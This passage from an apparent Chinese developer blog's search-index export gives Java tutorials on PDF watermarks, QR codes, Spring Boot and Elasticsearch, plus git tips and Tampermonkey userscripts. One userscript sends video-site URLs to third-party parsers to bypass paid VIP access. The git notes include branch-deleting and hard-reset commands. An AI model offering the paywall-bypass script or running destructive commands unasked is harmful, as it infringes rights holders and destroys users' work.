    <content type="text"><![CDATA[1. 添加依赖12345&lt;dependency&gt; &lt;groupId&gt;com.itextpdf&lt;/groupId&gt; &lt;artifactId&gt;itextpdf&lt;/artifactId&gt; &lt;version&gt;5.5.13&lt;/version&gt;&lt;/dependency&gt; 2. java代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121import com.itextpdf.text.Image;import com.itextpdf.text.pdf.PdfContentByte;import com.itextpdf.text.pdf.PdfGState;import com.itextpdf.text.pdf.PdfReader;import com.itextpdf.text.pdf.PdfStamper;import java.io.FileOutputStream;import java.util.Random;/** * @author pibigstar * @create 2018-11-30 13:30 * @desc pdf工具类 **/public class PDFUtil &#123; private static final float IAMGE_HEIGHT = 110f; // 水印图片的的高度 private static final float IAMGE_WIDTH = 110f; // 水印图片的的宽度 /** * @Description: 创建pdf文件 * @param filePath: 输出文件路径 * @param contents：文件内容 */ public static void createPdf(String filePath,String contents) &#123; Document document = null; try &#123; document = new Document(PageSize.A4); PdfWriter.getInstance(document,new FileOutputStream(filePath)); document.open(); //添加创建时间 document.addCreationDate(); //使用Windows系统字体（解决中文显示问题） BaseFont baseFont = BaseFont.createFont("C:/Windows/Fonts/SIMYOU.TTF",BaseFont.IDENTITY_H,BaseFont.NOT_EMBEDDED); Font font = new Font(baseFont); // 设置一段内容 Paragraph paragraph = new Paragraph(contents,font); //设置居中对齐 paragraph.setAlignment(Element.ALIGN_CENTER); document.add(paragraph); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125;finally &#123; if (document!=null)&#123; document.close(); &#125; &#125; &#125; /** * @Description: 添加Pdf水印 * @param pdfPath pdf地址 * @param logoPath 水印图片地址 * @param outPath 输出pdf地址 */ public static void addPdfMark(String pdfPath,String logoPath, String outPath) throws Exception &#123; PdfReader reader = new PdfReader(pdfPath, "PDF".getBytes()); // 如果是web项目，直接下载应该放到response的流里面 // PdfStamper stamp = new PdfStamper(reader,response.getOutputStream()); // 添加水印之后的pdf文件 PdfStamper stamp = new PdfStamper(reader, new FileOutputStream(outPath)); int pageSize = reader.getNumberOfPages(); float pageHeight = reader.getPageSize(1).getHeight(); float pageWidth = reader.getPageSize(1).getWidth(); try &#123; // 每两行显示两个 左边一个，右边一个 int lineNum = (int) (pageHeight / IAMGE_HEIGHT); // 行数 int middleY = (int) pageWidth / 2; for (int i = 1; i &lt;= pageSize; i++) &#123; for (int j = 0, k = 0; j &lt; lineNum; j = j + 4, k++) &#123; Random random = new Random(); // 放入水印 Image img = Image.getInstance(logoPath); img.scaleAbsolute(IAMGE_WIDTH, IAMGE_HEIGHT * 184 / 455); // 将水印显示到最底层 img.setAlignment(Image.UNDERLYING); int trueY; while (true) &#123; trueY = random.nextInt(middleY); if (trueY &gt; IAMGE_WIDTH / 2 &amp;&amp; trueY &lt; (middleY - IAMGE_WIDTH)) &#123; break; &#125; &#125; // 水印的位置 img.setAbsolutePosition(trueY, j * IAMGE_HEIGHT + (float) random.nextInt((int) IAMGE_HEIGHT) - (k % 2) * 10); // 旋转 角度 img.setRotationDegrees(random.nextInt(360)); PdfContentByte under = stamp.getUnderContent(i); PdfGState gs = new PdfGState(); // 设置透明度为0.5 gs.setFillOpacity(0.5f); under.setGState(gs); under.addImage(img); while (true) &#123; trueY = random.nextInt(middleY) + middleY; if (trueY &gt; middleY + IAMGE_WIDTH / 2 &amp;&amp; trueY &lt; (2 * middleY - IAMGE_WIDTH)) &#123; break; &#125; &#125; // 水印的位置 img.setAbsolutePosition(trueY, j * IAMGE_HEIGHT + (float) random.nextInt((int) IAMGE_HEIGHT) - (k % 2) * 10); // 旋转角度 img.setRotationDegrees(random.nextInt(360)); under.addImage(img); &#125; &#125; &#125; catch (Exception e) &#123; throw e; &#125; finally &#123; stamp.close(); reader.close(); &#125; &#125;&#125; 3. 测试1234567public class TestPDFUtil &#123; public static void main(String[] args) throws Exception &#123; PDFUtil.createPdf("D:\\1.pdf","我是派大星"); PDFUtil.addPdfMark("D:\\1.pdf","D:\\go_logo.png","D:\\test.pdf"); System.out.println("done"); &#125;&#125;]]></content>
      <categories>
        <category>Java,java工具类,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>pdf</tag>
        <tag>java</tag>
        <tag>水印</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java使用zxing制作二维码]]></title>
    <url>%2F2019%2F06%2F16%2Fjava%E4%BD%BF%E7%94%A8zxing%E5%88%B6%E4%BD%9C%E4%BA%8C%E7%BB%B4%E7%A0%81%2F</url>
    <content type="text"><![CDATA[因为项目需要，我封装了三个不同的二维码构建，一个是制作普通的二维码，一个是带logo的，还有一个是带logo和文字的，不废话，直接上代码。 添加依赖12345&lt;dependency&gt; &lt;groupId&gt;com.google.zxing&lt;/groupId&gt; &lt;artifactId&gt;core&lt;/artifactId&gt; &lt;version&gt;3.3.3&lt;/version&gt;&lt;/dependency&gt; 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196package com.pibgstar.demo.utils;import com.google.zxing.BarcodeFormat;import com.google.zxing.EncodeHintType;import com.google.zxing.MultiFormatWriter;import com.google.zxing.WriterException;import com.google.zxing.common.BitMatrix;import com.google.zxing.qrcode.decoder.ErrorCorrectionLevel;import javax.imageio.ImageIO;import java.awt.*;import java.awt.image.BufferedImage;import java.io.File;import java.util.HashMap;import java.util.Map;/** * @author pibigstar * @create 2018-11-29 10:17 * @desc 二维码生成工具类 **/public class ZXingCodeUtil &#123; // 二维码颜色 private static final int QRCOLOR = 0xFF000000; // 背景色 private static final int BGCOLOR = 0xFFFFFFFF; // 二维码宽度 private static final int width = 400; // 二维码高度 private static final int height = 400; /** * @Author:pibigstar * @Description: 生成普通的二维码 * @Date: */ public static BufferedImage createCode(String qrUrl) &#123; MultiFormatWriter multiFormatWriter = null; BitMatrix bm = null; BufferedImage image = null; Map&lt;EncodeHintType, Object&gt; hints = getDecodeHintType(); try &#123; multiFormatWriter = new MultiFormatWriter(); // 参数顺序分别为：编码内容，编码类型，生成图片宽度，生成图片高度，设置参数 bm = multiFormatWriter.encode(qrUrl, BarcodeFormat.QR_CODE, width, height, hints); int w = bm.getWidth(); int h = bm.getHeight(); image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB); // 开始利用二维码数据创建Bitmap图片，分别设为黑（0xFFFFFFFF）白（0xFF000000）两色 for (int x = 0; x &lt; w; x++) &#123; for (int y = 0; y &lt; h; y++) &#123; image.setRGB(x, y, bm.get(x, y) ? QRCOLOR : BGCOLOR); &#125; &#125; &#125; catch (WriterException e) &#123; e.printStackTrace(); &#125; return image; &#125; /** * @Author:pibigstar * @Description: 生成带logo的二维码 * @Date: */ public static BufferedImage createCodeWithLogo(String qrUrl, String logoPath) &#123; BufferedImage bim = createCode(qrUrl); try &#123; // 读取二维码图片，并构建绘图对象 BufferedImage image = bim; Graphics2D g = image.createGraphics(); // 读取Logo图片 BufferedImage logo = ImageIO.read(new File(logoPath)); //设置logo的大小,这里设置为二维码图片的20%,过大会盖掉二维码 int widthLogo = logo.getWidth(null) &gt; image.getWidth() * 3 / 10 ? (image.getWidth() * 3 / 10) : logo.getWidth(null), heightLogo = logo.getHeight(null) &gt; image.getHeight() * 3 / 10 ? (image.getHeight() * 3 / 10) : logo.getWidth(null); // logo放在中心 int x = (image.getWidth() - widthLogo) / 2; int y = (image.getHeight() - heightLogo) / 2; // logo放在右下角 // int x = (image.getWidth() - widthLogo); // int y = (image.getHeight() - heightLogo); //开始绘制图片 g.drawImage(logo, x, y, widthLogo, heightLogo, null); g.dispose(); logo.flush(); image.flush(); return image; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null; &#125; /** * @Author:pibigstar * @Description: 生成带logo和文字的二维码 * @Date: */ public static BufferedImage createCodeWithLogoAndText(String qrUrl, String logoPath, String text) &#123; BufferedImage image = createCodeWithLogo(qrUrl, logoPath); //把文字添加上去，文字不要太长，这里最多支持两行。太长就会自动截取啦 try &#123; if (text != null &amp;&amp; !text.equals("")) &#123; //新的图片，把带logo的二维码下面加上文字 BufferedImage outImage = new BufferedImage(400, 445, BufferedImage.TYPE_4BYTE_ABGR); Graphics2D outg = outImage.createGraphics(); //画二维码到新的面板 outg.drawImage(image, 0, 0, image.getWidth(), image.getHeight(), null); //画文字到新的面板 outg.setColor(Color.BLACK); outg.setFont(new Font("宋体", Font.BOLD, 30)); //字体、字型、字号 int strWidth = outg.getFontMetrics().stringWidth(text); if (strWidth &gt; 399) &#123;// //长度过长就截取前面部分// outg.drawString(productName, 0, image.getHeight() + (outImage.getHeight() - image.getHeight())/2 + 5 ); //画文字 //长度过长就换行 String productName1 = text.substring(0, text.length() / 2); String productName2 = text.substring(text.length() / 2, text.length()); int strWidth1 = outg.getFontMetrics().stringWidth(productName1); int strWidth2 = outg.getFontMetrics().stringWidth(productName2); outg.drawString(productName1, 200 - strWidth1 / 2, image.getHeight() + (outImage.getHeight() - image.getHeight()) / 2 + 12); BufferedImage outImage2 = new BufferedImage(400, 485, BufferedImage.TYPE_4BYTE_ABGR); Graphics2D outg2 = outImage2.createGraphics(); outg2.drawImage(outImage, 0, 0, outImage.getWidth(), outImage.getHeight(), null); outg2.setColor(Color.BLACK); outg2.setFont(new Font("宋体", Font.BOLD, 30)); //字体、字型、字号 outg2.drawString(productName2, 200 - strWidth2 / 2, outImage.getHeight() + (outImage2.getHeight() - outImage.getHeight()) / 2 + 5); outg2.dispose(); outImage2.flush(); outImage = outImage2; &#125; else &#123; outg.drawString(text, 200 - strWidth / 2, image.getHeight() + (outImage.getHeight() - image.getHeight()) / 2 + 12); //画文字 &#125; outg.dispose(); outImage.flush(); image = outImage; image.flush(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return image; &#125; /** * @Author:pibigstar * @Description: 构建二维码 * @Date: */ private static BufferedImage create(String qrUrl, String logoPath, String text) &#123; MultiFormatWriter multiFormatWriter = null; BitMatrix bm = null; BufferedImage image = null; Map&lt;EncodeHintType, Object&gt; hints = getDecodeHintType(); try &#123; multiFormatWriter = new MultiFormatWriter(); // 参数顺序分别为：编码内容，编码类型，生成图片宽度，生成图片高度，设置参数 bm = multiFormatWriter.encode(qrUrl, BarcodeFormat.QR_CODE, width, height, hints); int w = bm.getWidth(); int h = bm.getHeight(); image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB); // 开始利用二维码数据创建Bitmap图片，分别设为黑（0xFFFFFFFF）白（0xFF000000）两色 for (int x = 0; x &lt; w; x++) &#123; for (int y = 0; y &lt; h; y++) &#123; image.setRGB(x, y, bm.get(x, y) ? QRCOLOR : BGCOLOR); &#125; &#125; &#125; catch (WriterException e) &#123; e.printStackTrace(); &#125; return image; &#125; /** * 设置二维码的格式参数 * @return */ private static Map&lt;EncodeHintType, Object&gt; getDecodeHintType() &#123; // 用于设置QR二维码参数 Map&lt;EncodeHintType, Object&gt; hints = new HashMap&lt;EncodeHintType, Object&gt;(); // 设置QR二维码的纠错级别（H为最高级别）具体级别信息 hints.put(EncodeHintType.ERROR_CORRECTION, ErrorCorrectionLevel.H); // 设置编码方式 hints.put(EncodeHintType.CHARACTER_SET, "utf-8"); hints.put(EncodeHintType.MARGIN, 0); hints.put(EncodeHintType.MAX_SIZE, 350); hints.put(EncodeHintType.MIN_SIZE, 100); return hints; &#125;&#125; 测试123456789101112131415public class TestZxingCodeUtil &#123; public static void main(String[] args) throws IOException &#123; BufferedImage bim = ZXingCodeUtil.createCode("http://www.pibigstar.com"); ImageIO.write(bim, "png", new File("D:\\Document And Settings3\\Admin\\Desktop\\" + new Date().getTime() + ".png")); bim = ZXingCodeUtil.createCodeWithLogo("http://www.pibigstar.com","D:\\Document And Settings3\\Admin\\Desktop\\文本资料\\网站\\qq.png"); ImageIO.write(bim, "png", new File("D:\\Document And Settings3\\Admin\\Desktop\\" + new Date().getTime() + ".png")); bim = ZXingCodeUtil.createCodeWithLogoAndText("http://www.pibigstar.com","D:\\Document And Settings3\\Admin\\Desktop\\文本资料\\网站\\qq.png","派大星博客"); ImageIO.write(bim, "png", new File("D:\\Document And Settings3\\Admin\\Desktop\\" + new Date().getTime() + ".png")); System.out.println("done"); &#125;&#125; 生成效果1. 普通二维码 2. 带logo的二维码 3. 带logo和文字的二维码]]></content>
      <categories>
        <category>Java,java工具类,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>二维码</tag>
        <tag>zxing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot访问外部文件及默认路由]]></title>
    <url>%2F2019%2F06%2F15%2FSpringBoot%E8%AE%BF%E9%97%AE%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E5%8F%8A%E9%BB%98%E8%AE%A4%E8%B7%AF%E7%94%B1%2F</url>
    <content type="text"><![CDATA[1 新增配置类1234567891011121314151617181920212223242526272829303132package com.pibigstar.common.config;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;import com.pibigstar.common.Constant;@Configurationpublic class WebConfig implements WebMvcConfigurer&#123; /** * 访问外部文件配置，访问D盘下文件 */ @Override public void addResourceHandlers(ResourceHandlerRegistry registry) &#123; //配置server虚拟路径，handler为jsp中访问的目录，locations为files相对应的本地路径 registry.addResourceHandler("/files/**").addResourceLocations("file:///D:upload/"); &#125; /** * 配置默认路由 */ @Override public void addViewControllers(ViewControllerRegistry registry) &#123; //将浏览器的默认行为重定向到主页 registry.addViewController("/").setViewName("redirect:/index.htm"); //测试页面 registry.addViewController("/test.htm").setViewName("/test.jsp"); &#125;&#125; 2 访问我们将test.jpg文件上传到D盘的upload文件夹后，那么在页面端访问则通过：localhost:8080/files/test.jpg]]></content>
      <categories>
        <category>springboot,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>springboot访问D盘文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[油猴插件编写学习]]></title>
    <url>%2F2019%2F06%2F12%2F%E6%B2%B9%E7%8C%B4%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[油猴可以帮助我们在任意网页中镶嵌脚本来达到一些辅助我们的目的。 油猴官网：https://tampermonkey.net/ 1. 基本编写1234567891011121314151617// ==UserScript==// @name 脚本的名称// @namespace 可以写个人的网站什么的// @version 版本号// @description 脚本的描述// @author 作者// @match 匹配站点，在那个网页中启用该脚本，可使用正则进行匹配// @match http://119.36.55.224:6850/zentao/my/// @match http://www.iqiyi.com/v_*// @grant 需要什么权限（GM_addStyle添加css样式权限）// @grant GM_addStyle// @require 引用外部js// @require http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js// ==/UserScript==$(function() &#123; //在这里编写我们的脚本&#125;)(); 2. 写一个百度自动搜索小脚本1234567891011121314// ==UserScript==// @name 自动输入// @namespace http://pibigstar.com/// @version 0.1// @description 百度框自动输入// @author 派大星// @match https://www.baidu.com// @require https://cdn.bootcss.com/jquery/2.2.1/jquery.js// @grant none// ==/UserScript==(function() &#123; $("#kw").val("java派大星"); $("#su").click();&#125;)(); 3. 为百度新添加一个按钮123456789101112131415161718192021// ==UserScript==// @name 自动输入// @namespace http://pibigstar.com/// @version 0.1// @description 百度框自动输入// @author 派大星// @match https://www.baidu.com// @match http://www.cnblogs.com/*// @require https://cdn.bootcss.com/jquery/2.2.1/jquery.js// @grant GM_addStyle// ==/UserScript==(function() &#123; //与元数据块中的@grant值相对应，功能是生成一个style样式 GM_addStyle('#myBtn&#123;color: white;position: absolute;left: 1100px;top: 243px;width: 100px;height: 36px;background: #3385ff;border-bottom: 1px solid #2d7'); var html = "&lt;input type='button' id='myBtn' value='新增按钮' /&gt;"; $("body").append(html); // 定义按钮事件 $("#myBtn").click(function()&#123; alert("点击了新增按钮"); &#125;);&#125;)(); 4. 综合，写一个VIP视频解析脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// ==UserScript==// @name 视频vip解析// @namespace http://mxspvip.cn// @version 1.2// @description 支持，优酷、爱奇艺、腾讯、乐视等vip视频播放// @author pibigstar// @match http://www.iqiyi.com/v_*// @match http://www.mgtv.com/v/*// @match http://www.le.com/ptv/*// @match http://v.youku.com/v_show/*// @match http://film.sohu.com/album/*// @match http://tv.sohu.com/*// @match https://v.qq.com/x/cover/*// @grant GM_addStyle// @require https://cdn.bootcss.com/jquery/2.2.1/jquery.js// ==/UserScript==(function ()&#123;GM_addStyle('#floatDivBoxs&#123;width:170px;background:#fff;position:fixed;top:180px;right:0;z-index:999;&#125;')GM_addStyle('#floatDivBoxs a&#123;color:#666;text-decoration:none;outline:none;&#125;')GM_addStyle('#floatDivBoxs a:hover&#123;color:#e8431f;&#125;')GM_addStyle('#floatDivBoxs .floatDtt&#123;width:100%;height:50px;line-height:50px; background:#f08326;color:#fff;font-size:20px;text-indent:22px;position:relative;&#125;')GM_addStyle('#floatDivBoxs .floatDqq&#123;padding:0 14px;&#125;')GM_addStyle('#floatDivBoxs .floatDqq li&#123;height:45px;line-height:45px;font-size:15px;border-bottom:1px solid #e3e3e3;&#125;')GM_addStyle('#floatDivBoxs .floatDbg&#123;width:100%;height:20px;box-shadow:-2px 0 3px rgba(0,0,0,0.25);&#125;')GM_addStyle('.floatShadow&#123;box-shadow:-2px 0 3px rgba(0,0,0,0.25);&#125;')GM_addStyle('#rightArrow&#123;width:50px;height:45px;position:fixed;top:180px;right:170px;z-index:999;&#125;')GM_addStyle('#rightArrow a&#123;background:#F08326;display:block;height:50px;&#125;') GM_addStyle('#rightArrow a img&#123;background:#F08326;display:block;height:50px;width:45px;&#125;')var html = '&lt;div id="rightArrow"&gt;&lt;a href="javascript:;" title=""&gt;&lt;img id="rightImg" src="http://pmyln8jkg.bkt.clouddn.com/youhou/right.png" /&gt;&lt;/a&gt;&lt;/div&gt;' html += '&lt;div id="floatDivBoxs"&gt;' html += '&lt;div class="floatDtt"&gt;vip通道&lt;/div&gt;' html += '&lt;div class="floatShadow"&gt;' html += '&lt;ul class="floatDqq"&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="http://www.wmxz.wang/video.php?url="&gt; 无名小站&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="https://cn.bjbanshan.cn/jiexi.php?url="&gt;1号接口&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="https://aikan-tv.com/tong.php?url="&gt;2号接口&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="http://api.51ckm.com/jx.php?url="&gt;3号接口&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="http://api.nepian.com/ckparse/?url="&gt;4号接口&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="http://jqaaa.com/jq3/?url="&gt;5号接口&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="http://2gty.com/apiurl/yun.php?url="&gt;6号接口&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="http://http://aikan-tv.com/?url="&gt;7号接口&lt;/a&gt;&lt;/li&gt;' html += '&lt;li&gt;&lt;a href="#" name="vip" url="http://y.mt2t.com/lines?url="&gt;8号接口&lt;/a&gt;&lt;/li&gt;' html += ' &lt;/ul&gt;' html += '&lt;/div&gt;' html += '&lt;/div&gt;'// 添加到页面上$("body").append(html);//浮动代码var flag=1;$('#rightArrow').click(function()&#123; if(flag==1)&#123; $("#floatDivBoxs").animate(&#123;right: '-175px'&#125;,300); $(this).animate(&#123;right: '-5px'&#125;,300); $(this).css('background-position','-50px 0'); $("#rightImg").attr("src","http://pmyln8jkg.bkt.clouddn.com/youhou/left.png"); flag=0; &#125;else&#123; $("#floatDivBoxs").animate(&#123;right: '0'&#125;,300); $(this).animate(&#123;right: '170px'&#125;,300); $(this).css('background-position','0px 0'); $("#rightImg").attr("src","http://pmyln8jkg.bkt.clouddn.com/youhou/right.png"); flag=1; &#125;&#125;);&#125;)();// 监听每一个接口点击事件$("a[name='vip']").on("click",function()&#123; //获取当前网址 var url = window.location; var api = $(this).attr("url"); window.open(api+url,'','width=632,height=388,toolbar=no,location=no,status=no, menubar=no, resizable=yes, scrollbars=yes'); return false;&#125;)]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>脚本</tag>
        <tag>油猴</tag>
        <tag>浏览器插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[注解防止表单重复提交]]></title>
    <url>%2F2019%2F06%2F10%2F%E6%B3%A8%E8%A7%A3%E9%98%B2%E6%AD%A2%E8%A1%A8%E5%8D%95%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4%2F</url>
    <content type="text"><![CDATA[1. 注解1234@Target(ElementType.METHOD)@Retention(RetentionPolicy.RUNTIME)public @interface StopRepeatSubmit &#123;&#125; 2. 拦截处理器12345678910111213141516171819202122232425262728293031323334353637383940/** * @author pibigstar * @desc 防止表单重复提交拦截处理器 **/public class StopRepeatSubmitHandlerInterceptor extends HandlerInterceptorAdapter &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; if (handler instanceof HandlerMethod) &#123; HandlerMethod handlerMethod = (HandlerMethod) handler; Method method = handlerMethod.getMethod(); StopRepeatSubmit annotation = method.getAnnotation(StopRepeatSubmit.class); if (annotation!=null) &#123; // 判断是否已经提交过了 String paramter = request.getParameterMap().toString(); String url = request.getRequestURL().toString(); String token = url+paramter; Object attrToken = request.getSession().getAttribute("token"); if (attrToken == null) &#123; // 第一次请求 request.getSession().setAttribute("token",token); return true; &#125; if (attrToken.toString().equals(token))&#123; // 重复提交了 return false; &#125; else &#123; // 第一次提交 request.getSession().setAttribute("token",token); return true; &#125; &#125; return true; &#125; else &#123; return super.preHandle(request, response, handler); &#125; &#125;&#125; 3. 使用1234@PostMapping("/submit")@StopRepeatSubmitpublic void submit()&#123;&#125;]]></content>
      <categories>
        <category>Java,SpringBoot技能大全</category>
      </categories>
      <tags>
        <tag>注解</tag>
        <tag>重复提交</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git常用操作详细说明]]></title>
    <url>%2F2019%2F06%2F10%2Fgit%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%2F</url>
    <content type="text"><![CDATA[初级的就不说了，下面记录一些常用且稍微高级点的操作@[TOC] git的管理流程工作区 ——&gt; git add ——&gt; Index[索引][暂存区] ——&gt; git commit ——&gt; HEAD[快照] 当执行git add 后其实就是将更改的文件放入到暂存区中，当执行git commit时就是将暂存区的内容提交到当前分支 HEAD快照是保存你最后一次commit的内容 git push 是将快照区的内容push 上去 git常用操作12345678910111213141516171819# 图形化显示log日志gitk --all# 简洁的log 日志git log --oneline # 查看所有分支git log --all # 显示最近4个提交git log -n4 # 显示变更信息git log --graph# 查看暂存区与HEAD中的差别git diff --cached # 配置git loggit config --global alias.lg "log --graph --pretty=format:'%Cred%h%Creset - %C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset' --abbrev-commit --date=relative"# 使用git lg# 查看提交了多少行代码git log --author="$(git config --get user.name)" --pretty=tformat: --numstat | gawk '&#123; add += $1 ; subs += $2 ; loc += $1 - $2 &#125; END &#123; printf "added lines: %s removed lines : %s total lines: %s\n",add,subs,loc &#125;' - 1. 关联 1.1 关联仓库1git remote add origin 仓库地址 你可以同时关联其他的仓库（也包括gitee和gitlab） 1git remote add origin-2 仓库地址 这样你push的时候 1git push origin-2 master 2. 分支2.1 只创建一个分支1git branch fix-1 2.2 创建分支并切换此分支1git checkout -b feat-1 2.3 切换分支1git checkout master 2.4 查看所有分支1git branch -v 2.5 删除分支1git branch -d feat-1 2.6 删除除master以外的所有分支1git branch | grep -v "master" | xargs git branch -D 3. 临时暂存区3.1 将更改放到临时暂存区1git stash 3.2 将更改从临时暂存区取出1git stash pop 3.3 查看临时暂存区内容1git stash list 3.4 恢复指定临时暂存区1git stash apply stash@&#123;id&#125; 4. 合并冲突1.更新代码 git fetch2.合并分支 git rebase origin/develop //将develop分支与此分支合并3.会进入合并分支，当有CONFLICT:Merge file.txt, 手动去修改此文件4.修改之后添加冲突文件 git add file.txt5.继续合并 git rebase --continue, 如果有错误继续 执行 3 4 步骤6.当分支名变成你的分支名则表示合并完成7.查看当前状态 git status8.如果状态都为已暂存，则可以执行 git push origin 分支名 进行提交 push之前忘记git pull出现 1! [rejected] master -&gt; master (fetch first) 可以使用下面这个命令 1git pull --rebase origin master 这个命令是先取消commit记录，并且把它们临时 保存为补丁(patch)(这些补丁放到”.git/rebase”目录中)，之后同步远程库到本地，最后合并补丁到本地库之中。 然后再直接进行push就可以了 5. 回滚5.1 撤销掉本地修改（还没被git add）1234# 撤销某具体文件git checkout fileName# 撤销所有git checkout . 5.2 撤销上一次git add的内容1234# 撤销某个文件git reset HEAD fileName# 撤销所有git reset HEAD . 只撤销某个文件 1git reset HEAD 文件路径/文件名 5.3 撤销上一次git commit 先查看日志，记录commit id 1git log 恢复到指定commit 123git reset commit_id# 备用git reset --hard commit_id 5.4 修改上一次commit1git commit --amend 5.5 撤销git commit 和 git add 以及 工作区更新的内容1git reset --hard HEAD~ 5.5 删除远程分支中某个文件这个只是让此文件不受版本控制了，而本地是不会删除它的 12345git rm -r –-cached 文件路径/文件名git add .git commit -m "delete the file"git push origin master 5.6 回滚到指定版本 查看日志拿到commitid 1git log 恢复到指定版本 1git reset --hard commit_id 6.开源协作6.1 fork别人代码此时你的仓库就会有一个此项目的副本 6.2 克隆代码1git clone *****.git 6.3 添加别人远程仓库地址为了可以随时更新代码，这里最好将别人仓库的地址也新增一下 1git remote add origin2 *****.git 拉取别人最新代码 1git pull origin2 master 6.4 提交添加新的功能之后开始提交代码，代码是提交到你的仓库中 1git push origin master 6.5 提交PR去你GitHub中此项目然后会有一个New pull Request 点击它，然后向别人的项目提交PR]]></content>
      <categories>
        <category>工具使用,git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>回滚</tag>
        <tag>git删除</tag>
        <tag>暂存区</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringBoot操作elasticsearch]]></title>
    <url>%2F2019%2F06%2F08%2FSpringBoot%E6%93%8D%E4%BD%9Celasticsearch%2F</url>
    <content type="text"><![CDATA[注意： elasticsearch版本一定要和SpringBoot版本相对应。 这里使用的是：elasticsearch : 6.5.3, Springboot: 2.1.0 下载Elasticsearch:https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.zip 监控Elasticsearch中的值：https://artifacts.elastic.co/downloads/kibana/kibana-6.5.3-windows-x86_64.zip 启动elasticsearch 1elasticsearch-6.5.3/bin/ealsticsearch.batelasticsearch-6.5.3/bin/ealsticsearch.bat 启动监控 1kibana-6.5.3-windows-x86_64/bin/kibana.bat 启动成功后访问：127.0.0.1:5601 1. 添加依赖1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.data&lt;/groupId&gt; &lt;artifactId&gt;spring-data-elasticsearch&lt;/artifactId&gt; &lt;/dependency&gt; 2. 添加配置信息1234567server: port: 8080spring: data: elasticsearch: cluster-nodes: 127.0.0.1:9300 cluster-name: elasticsearch 3. 标记bean12345678// index索引就相当于数据库，type就相当于表@Document(indexName = "pibigstar",type = "user")public class ElasticUser &#123; private Long id; private String username; private String password; //setter,getter方法&#125; 4. dao层12345import com.pibgstar.demo.elastic.bean.ElasticUser;import org.springframework.data.elasticsearch.repository.ElasticsearchRepository;public interface ElasticUserDao extends ElasticsearchRepository&lt;ElasticUser,Long&gt; &#123;&#125; 5. Controller层12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576@RestController@RequestMapping("/user")public class ElasticUserController &#123; private long sum = 1; @Autowired private ElasticUserDao userDao; // 获取全部 @GetMapping("/list") public List&lt;ElasticUser&gt; list()&#123; Iterable&lt;ElasticUser&gt; all = userDao.findAll(); Iterator&lt;ElasticUser&gt; iterator = all.iterator(); List&lt;ElasticUser&gt; list=new ArrayList&lt;&gt;(); while (iterator.hasNext()) &#123; list.add(iterator.next()); &#125; return list; &#125; // 添加 @RequestMapping("/add") public ElasticUser add(ElasticUser user) &#123; user.setId(sum++); ElasticUser save = userDao.save(user); return save; &#125; // 根据id获取 @GetMapping("/get") public ElasticUser get(Long id)&#123; Optional&lt;ElasticUser&gt; byId = userDao.findById(id); return byId.get(); &#125; // 删除 @RequestMapping("/delete") public void delete(ElasticUser user)&#123; userDao.delete(user); &#125; // 更新 @RequestMapping("/update") public ElasticUser update(ElasticUser user) &#123; ElasticUser save = userDao.save(user); return save; &#125; // 搜索 @GetMapping("/query") public List&lt;ElasticUser&gt; query(@RequestParam(name = "value") String value)&#123; // 当id、username、password字段的值等于value时可查出数据（里面的值要有value，不然会报错） // QueryStringQueryBuilder builder = new QueryStringQueryBuilder(value); // 搜索 id、username字段的值等于value // QueryBuilder builder = QueryBuilders.multiMatchQuery(value,"id","username"); // 模糊查询，username字段中的值含有value QueryBuilder builder1 = 